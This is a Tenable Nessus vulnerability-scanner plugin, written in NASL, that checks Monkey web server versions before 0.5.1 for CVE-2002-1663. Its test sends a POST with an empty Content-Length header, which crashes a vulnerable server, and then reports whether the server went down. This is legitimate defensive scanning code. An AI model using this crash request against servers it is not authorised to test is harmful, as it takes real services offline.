#
# (C) Tenable Network Security, Inc.
#

# Ref:
# From: Daniel <keziah@uole.com>
# Subject: Bug in Monkey Webserver 0.5.0 or minors versions
# To: bugtraq@securityfocus.com
# Date: Sun, 3 Nov 2002 23:21:42 -0300
#


include("compat.inc");

if(description)
{
 script_id(11924);
 script_version ("$Revision: 1.20 $");
 script_cve_id("CVE-2002-1663");
 script_bugtraq_id(6096);
 script_osvdb_id(20824);
 
 script_name(english:"Monkey HTTP Daemon (monkeyd) Post_Method Function Crafted Content-Length Header DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is susceptible to a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"The remote Monkey Web Server crashes when it receives an incorrect
POST command with an empty 'Content-Length:' field." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2002/Nov/47" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Monkey version 0.5.1 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2003/11/13");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/10/29");
 script_cvs_date("$Date: 2016/10/27 15:03:55 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_summary(english: "POST with empty Content-Length line kills Monkey Web server");
 # No use to make an ACT_MIXED_ from this
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");
 script_family(english: "Web Servers");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 # The listening port in the example configuration file is 2001
 # I suspect that some people might leave it unchanged.
 script_require_ports("Services/www",80, 2001);
 exit(0);
}

#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80); # 2001 ?
if(! get_port_state(port)) exit(0);

banner = get_http_banner(port:port);
#if (!banner || ("Monkey/" >!< banner && "Monkey Server" >!< banner)) exit(0);

if (http_is_dead(port:port)) exit(0);

h = make_array("Content-Length", "");
r = http_send_recv3(port: port, method: 'POST', item: "/", data: "", add_headers: h);

if (http_is_dead(port: port, retry: 3))
{
  security_warning(port);
  set_kb_item(name:"www/buggy_post_crash", value:TRUE);
}
